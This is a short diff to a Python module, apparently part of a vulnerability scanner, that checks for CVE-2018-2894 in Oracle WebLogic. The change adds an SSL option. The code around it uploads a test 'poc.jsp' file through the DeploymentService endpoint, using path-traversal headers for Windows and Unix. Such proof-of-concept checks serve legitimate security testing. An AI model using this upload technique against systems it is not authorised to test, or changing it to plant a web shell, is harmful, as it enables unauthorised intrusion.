@@ -18,7 +18,7 @@ class CVE_2018_2894(Star):
     }
     type = target_type.MODULE
 
-    def light_up(self, dip, dport, *args, **kwargs) -> (bool, dict):
+    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
         filename = 'poc.jsp'
         data = f'''
 ------WebKitFormBoundary7MA4YWxkTrZu0gW
@@ -35,10 +35,10 @@ hello
                    'wl_upload_application_name': '\\\\..\\\\tmp\\\\_WL_internal\\\\bea_wls_internal\\\\9j4dqk\\\\war',
                    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'}
         url = 'http://{}:{}/bea_wls_deployment_internal/DeploymentService'.format(dip, dport)
-        win_res, data = http(url, 'POST', headers=headers, data=data)
+        win_res, data = http(url, 'POST', headers=headers, data=data, ssl=force_ssl)
         url = 'http://{}:{}/bea_wls_deployment_internal/DeploymentService'.format(dip, dport)
         headers['wl_upload_application_name'] = '/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war'
-        unx_res, data = http(url, 'POST', headers=headers, data=data)
+        unx_res, data = http(url, 'POST', headers=headers, data=data, ssl=force_ssl)
         if (win_res != None and win_res.status_code != 404) or (unx_res != None and unx_res.status_code != 404):
             return True, {'msg': 'finish.'}
         # if (win_res != None and filename in win_res.text) or (unx_res != None and filename in unx_res.text):
